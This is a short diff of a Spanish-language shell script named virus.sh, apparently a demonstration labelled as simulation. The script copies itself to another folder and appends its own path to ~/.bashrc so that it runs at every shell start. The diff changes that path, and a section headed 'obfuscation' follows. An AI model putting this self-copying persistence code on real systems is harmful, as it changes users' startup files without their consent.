@@ -25,7 +25,7 @@ cp "$0" "$dest_folder/"
 # -------------------------------
 echo "Simulación de persistencia: Añadiendo línea a ~/.bashrc"
 echo "# Simulación de persistencia para virus.sh" >> "$HOME/.bashrc"
-echo "$HOME/ruta/al/script/virus.sh" >> "$HOME/.bashrc"
+echo "$HOME/virus.sh" >> "$HOME/.bashrc"
 
 # -------------------------------
 # Ofuscación:
